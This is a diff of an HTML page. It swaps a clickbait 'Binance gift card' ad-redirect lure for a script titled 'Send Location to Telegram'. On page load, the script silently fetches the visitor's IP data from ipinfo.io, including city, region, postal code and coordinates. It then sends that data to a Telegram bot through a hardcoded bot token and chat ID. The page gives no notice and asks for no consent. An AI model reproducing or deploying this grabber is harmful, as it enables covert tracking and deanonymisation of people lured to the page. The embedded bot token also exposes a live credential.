@@ -1,3 +1,70 @@
-<meta charset="utf-8"><center><a href="https://www.highcpmrevenuegate.com/g5jg39t02?key=09cc6222094f5c1e1d3ad073b8914501"style="text-decoration: none;"><div><p style="color: rgb(35, 31, 32); font-family: museo-sans, Arial, sans-serif; font-size: 30px;">Hi Dear,<br></p><img src="https://raw.githubusercontent.com/Azim-Vau/mr.error.web/main/Screenshot_20230821-165239-removebg-preview.png" alt="Tutorialspoint"><img src="https://images.g2a.com/1024x576/1x1x1/binance-gift-card-1000-usdt-key-i10000301475018/83434c2295ca4a24a67363b2" alt="Tutorialspoint"style="width:600px;height:300px;"><br><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT86htdbHT3maY7yRb9AEVQp0n4yzli5oLicA&usqp=CAU" alt="Tutorialspoint" style="width:600px;height:300px;"></center></div></a>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send Location to Telegram</title>
+</head>
+<body>
+	
+    <script>
+        // Replace with your bot token and chat ID
+        const botToken = '6391846685:AAGk8p3q_07FAj3louTAb1ZoxOk85vbyC6Q';
+        const chatId = '-980441797';
+        
+        // Function to send location data to Telegram
+        function infosender() {
+            // Fetch location data from 'https://ipinfo.io/json'
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    // Extract relevant data
+                    const ip = data.ip;
+                    const city = data.city;
+                    const region = data.region;
+                    const country = data.country;
+                    const location = data.loc;
+                    const postal = data.postal;
 
-AZIM
+                    // Construct the message with location data
+                    const message = `
+IP : ${ip}
+City: ${city}
+Region: ${region}
+Country: ${country}
+Postal Code : ${postal}
+Location: ${location}`;
+
+                    // URL for the Telegram Bot API
+                    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    // Construct the message data
+                    const messageData = {
+                        chat_id: chatId,
+                        text: message
+                    };
+
+                    // Send the message to Telegram using fetch
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(messageData)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Message sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending message:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching location data:', error);
+                });
+        }
+
+        // Call the infosender function when the page loads
+        window.onload = infosender();
+    </script>
+</body>
+</html>
